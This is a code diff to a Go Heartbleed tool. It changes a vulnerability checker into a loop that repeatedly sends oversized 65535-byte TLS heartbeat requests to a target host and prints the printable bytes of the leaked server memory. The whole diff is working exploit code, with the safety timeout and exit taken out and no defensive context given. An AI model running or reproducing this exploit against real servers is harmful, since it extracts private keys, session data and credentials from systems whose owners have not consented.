@@ -5,9 +5,8 @@ import (
 	"log"
 	"os"
 	"strings"
-	"time"
 
-	"github.com/V-E-O/heartbleeder/tls"
+    "github.com/V-E-O/heartbleeder/tls"
 )
 
 func main() {
@@ -19,28 +18,32 @@ func main() {
 	if !strings.Contains(host, ":") {
 		host += ":443"
 	}
-	c, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
-	if err != nil {
-		log.Printf("Error connecting to %s: %s\n", host, err)
-		os.Exit(2)
-	}
 
-	go func() {
-		time.Sleep(10 * time.Second)
-		fmt.Println("SECURE - timed out while waiting for a response from", host)
-		os.Exit(0)
-	}()
+    for {
+    	c, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
+    	if err != nil {
+    		log.Printf("Error connecting to %s: %s\n", host, err)
+    		os.Exit(2)
+    	}
+        _, res, err := c.Heartbeat(65535, nil)
+    	switch err {
+    	case nil:
+    		//fmt.Printf("INSECURE - %s has the heartbeat extension enabled and is vulnerable\n", host)
+            for i := 0; i < len(res); i++ {
+                if ' ' <= res[i] && res[i] <= '~' {
+                    fmt.Printf("%c", res[i])
+                }
+            }
+            fmt.Printf("\n")
+            //time.Sleep(100 * time.Millisecond)
+    		//os.Exit(1)
+    	case tls.ErrNoHeartbeat:
+    		fmt.Printf("SECURE - %s does not have the heartbeat extension enabled\n", host)
+    	default:
+    		fmt.Printf("SECURE - %s has heartbeat extension enabled but is not vulnerable\n", host)
+    		fmt.Printf("This error happened while processing the heartbeat (almost certainly a good thing): %q\n", err)
+	}}
 
-	_, res, err = c.Heartbeat(32, nil)
-	switch err {
-	case nil:
-		fmt.Printf("INSECURE - %s has the heartbeat extension enabled and is vulnerable\n", host)
-		os.Exit(1)
-	case tls.ErrNoHeartbeat:
-		fmt.Printf("SECURE - %s does not have the heartbeat extension enabled\n", host)
-	default:
-		fmt.Printf("SECURE - %s has heartbeat extension enabled but is not vulnerable\n", host)
-		fmt.Printf("This error happened while processing the heartbeat (almost certainly a good thing): %q\n", err)
-	}
-    fmt.Printf("%s\n", res)
 }
+
+
